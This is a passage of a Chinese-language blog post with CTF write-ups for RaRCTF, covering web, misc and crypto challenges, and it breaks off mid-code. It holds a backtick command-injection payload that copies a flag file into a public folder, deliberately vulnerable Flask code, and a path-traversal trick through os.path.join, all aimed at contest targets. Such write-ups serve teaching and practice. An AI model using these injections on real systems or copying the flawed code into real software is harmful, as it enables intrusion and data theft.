"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Rima"><a href="#Rima" class="headerlink" title="Rima"></a>Rima</h3><pre class="line-numbers language-none"><code class="language-none">Sequences are known to be good solutions, but are they good problems?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="RaRCTF"><a href="#RaRCTF" class="headerlink" title="RaRCTF"></a>RaRCTF</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>比赛题目的质量很好，题量大，题型丰富，简单的简单，难的难，做起来简单的也比较有成就感hhh，只是比赛的时候做出来的题目不多，赛后想要复现的时候又晚了，那时web、pwn、部分crypto、部分misc都已经无法复现了，所以这里只复现了一丢丢。</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="lemonthinker-100-points"><a href="#lemonthinker-100-points" class="headerlink" title="lemonthinker (100 points)"></a>lemonthinker (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">generate your lemonthinks here!

lemonthink

Note: All characters that look like a O are actually a 0, please  try replacing all O&#39;s with  0&#39;s if you find that your flag does not work.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这题很简单啊，一个简单的命令执行的bypass</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
text <span class="token operator">=</span> text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
filename <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>chars<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".png"</span>

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"python3 generate.py </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string"> \"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后面的system函数是关键，这里可以直接使用反引号进行命令执行，将读到的flag输出到可访问的目录之中即可</p>
<pre class="line-numbers language-none"><code class="language-none">&#96;cat ..&#x2F;flag.txt &gt; .&#x2F;static&#x2F;images&#x2F;flag.txt&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>再访问</p>
<pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;193.57.159.27:36679&#x2F;static&#x2F;images&#x2F;flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即可得到flag</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Secure-Uploader-150-points"><a href="#Secure-Uploader-150-points" class="headerlink" title="Secure Uploader (150 points)"></a>Secure Uploader (150 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">A new secure, safe and smooth uploader!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> g
<span class="token keyword">import</span> sqlite3
<span class="token keyword">import</span> os
<span class="token keyword">import</span> uuid

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SCHEMA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""CREATE TABLE files (
id text primary key,
path text
);
"""</span>


<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    g_db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> g_db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        g_db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> g_db


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span>
<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>
    cur <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cur<span class="token punctuation">.</span>executescript<span class="token punctuation">(</span>SCHEMA<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>
&lt;html>
&lt;body>
&lt;form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    &lt;input type="file" name="file">
    &lt;input type="submit" value="Upload File" name="submit">
&lt;/form>

&lt;/body>
&lt;/html>"""</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">"."</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Bad filename!"</span><span class="token punctuation">,</span> <span class="token number">403</span>
    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    uid <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into files (id, path) values (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uid<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Duplicate file"</span>
    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># print('uploads/' + file.filename)</span>

    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'uploads/'</span> <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/file/'</span> <span class="token operator">+</span> uid<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file/&lt;id>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select path from files where id=?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>

    <span class="token comment"># print(res[0])</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    考的是关于<code>os.path.join()</code>函数的知识点，<a target="_blank" rel="noopener" href="https://blog.csdn.net/xrinosvip/article/details/84202547">关于该知识点</a>，其实就是他合并的时候会有这种，如果一个参数是以<code>/</code>这个符号开头的，就将这个参数作为开头继续向后拼接。故</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这句话，参数<code>res[0]</code>可控，将它命名为<code>/flag</code>即可实现目录遍历从而也访问到<code>/flag</code>。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808204411277.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Fancy-Button-Generator-100-points"><a href="#Fancy-Button-Generator-100-points" class="headerlink" title="Fancy Button Generator (100 points)"></a>Fancy Button Generator (100 points)</h3><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="discord-10-points"><a href="#discord-10-points" class="headerlink" title="discord (10 points)"></a>discord (10 points)</h3><p>这是个白嫖的flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210807170208608.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;wh3n_4r3_w3-m0v1ng_b4ck_t0-IRC?_29ff18a15e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Coherence-Check-10-points"><a href="#Coherence-Check-10-points" class="headerlink" title="Coherence Check (10 points)"></a>Coherence Check (10 points)</h3><p>白送的flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210807170824680.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;Welcome_To_RaRCTF!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="minigen-100-points"><a href="#minigen-100-points" class="headerlink" title="minigen (100 points)"></a>minigen (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">A stream cipher in only 122 bytes!

Note: This has been tested on python versions 3.8 and 3.9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>给出了一个脚本，一个输出，脚本是个简单的异或加密脚本+参数伪随机。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'def f(x):'</span> <span class="token operator">+</span> <span class="token string">'yield((x:=-~x)*x+-~-x)%727;'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>
g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可以看到<code>next(g)</code>这个参数是伪随机的，这里直接写个脚本碰撞一下即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'def f(x):'</span> <span class="token operator">+</span> <span class="token string">'yield((x:=-~x)*x+-~-x)%727;'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>
g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
print(*map(lambda c: ord(c) ^ next(g), list(open('f').read())))
"""</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
a <span class="token operator">=</span> <span class="token string">'281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#if ord('r') ^ next(g) == a[0]:   # next(g) == 363</span>
    <span class="token keyword">if</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">363</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span class="token comment"># arctf&#123;pyg01f_1s_fun&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    <code>if ord(&#39;r&#39;) ^ next(g) == a[0]</code>这个判断条件会对结果造成一定程度的影响，所以这里改的直接了一点。</p>
<p>​    最后别忘了在结果前面加上<code>r</code>。</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;pyg01f_1s_fun&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="sRSA-100-points"><a href="#sRSA-100-points" class="headerlink" title="sRSA (100 points)"></a>sRSA (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">we have created the securest possible rsa algorithm!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这题说不上是rsa，他的算法为<code>(m * e) mod n</code>，rsa中<code>m</code>与<code>e</code>的关系应该是幂的关系，这里直接对商值进行爆破即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token triple-quoted-string string">"""
p = getPrime(256)
q = getPrime(256)
n = p * q
e = 0x69420

flag = bytes_to_long(open("flag.txt", "rb").read())
print("n =",n)
print("e =", e)
print("ct =",(flag * e) % n)
"""</span>
n <span class="token operator">=</span> <span class="token number">5496273377454199065242669248583423666922734652724977923256519661692097814683426757178129328854814879115976202924927868808744465886633837487140240744798219</span>
e <span class="token operator">=</span> <span class="token number">431136</span>
ct <span class="token operator">=</span> <span class="token number">3258949841055516264978851602001574678758659990591377418619956168981354029697501692633419406607677808798749678532871833190946495336912907920485168329153735</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> n <span class="token operator">+</span> ct<span class="token punctuation">)</span> <span class="token operator">//</span> e
    <span class="token keyword">if</span> e <span class="token operator">*</span> flag <span class="token operator">==</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> n <span class="token operator">+</span> ct<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># b'rarctf&#123;ST3GL0LS_ju5t_k1dd1ng_th1s_w4s_n0t_st3g_L0L!_83b7e829d9&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="unrandompad-150-points-未解出"><a href="#unrandompad-150-points-未解出" class="headerlink" title="unrandompad (150 points) 未解出"></a>unrandompad (150 points) 未解出</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">Yeah I use randomized padding, it increases security!

Note: This is a part 1 challenge of randompad. Take a look at the source for that one and compare the two for a hint on how to solve.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> getrandbits
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long


<span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># normal rsa key generation</span>
    primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    e <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        primes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e<span class="token punctuation">,</span> primes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> primes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># pkcs#1 v1.5</span>
    ms <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    ns <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">11</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
    padlength <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span>
    ps <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span>padlength <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>padlength<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token string">b"\x00\x02"</span> <span class="token operator">+</span> ps <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">+</span> ms<span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># standard rsa</span>
    res <span class="token operator">=</span> pad<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error :("</span><span class="token punctuation">,</span> <span class="token string">"message too long"</span><span class="token punctuation">)</span>


menu <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
[1] enc()
[2] enc(flag)
[3] quit
"""</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

e<span class="token punctuation">,</span> n <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span>
        opt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"opt: "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> opt <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>
            encrypt<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"msg: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> opt <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>
            encrypt<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/challenge/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> opt <span class="token operator">==</span> <span class="token string">"3"</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"idk"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
